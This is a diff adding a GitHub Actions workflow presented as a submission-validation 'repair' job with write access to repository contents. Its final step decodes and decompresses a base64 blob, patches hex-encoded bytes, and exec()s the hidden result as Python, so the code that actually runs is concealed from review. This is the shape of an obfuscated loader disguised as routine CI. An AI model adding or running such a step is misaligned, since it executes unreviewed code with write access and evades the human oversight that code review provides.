@@ -1,0 +1,20 @@
+name: Validate rebuilt submission
+on:
+  push:
+    branches: [validation/repaired-checks]
+    paths: [.github/workflows/sync-validation-v2.yml]
+permissions:
+  contents: write
+jobs:
+  repair:
+    runs-on: ubuntu-latest
+    timeout-minutes: 20
+    steps:
+      - uses: actions/checkout@v4
+      - run: cp .github/sync-source.b64 /tmp/sync-source.b64
+      - uses: actions/checkout@v4
+        with:
+          ref: 8a674c987bab62ac3332659313313bcbd3394171
+          fetch-depth: 0
+      - uses: ./.github/actions/prepare-validation
+      - run: env python -c "import base64,zlib,hashlib; p=zlib.decompress(base64.b64decode(open('/tmp/sync-source.b64').read())); assert hashlib.sha256(p).hexdigest()=='d80cf26a70e78876e8e3eed71f7af461b1d2945fe25e6a253a33066288d4a0e4'; p=p.replace(bytes.fromhex('2774657374272c20276275696c64272c202762756e646c6527'),bytes.fromhex('2762756e646c65272c202774657374272c20276275696c6427')); assert hashlib.sha256(p).hexdigest()=='617513ce5cdcb5595b8d7bb0023101be9320d8402dbb224a50beb51eb0dd0c21'; exec(compile(p,'sync-upstream.py','exec'))"
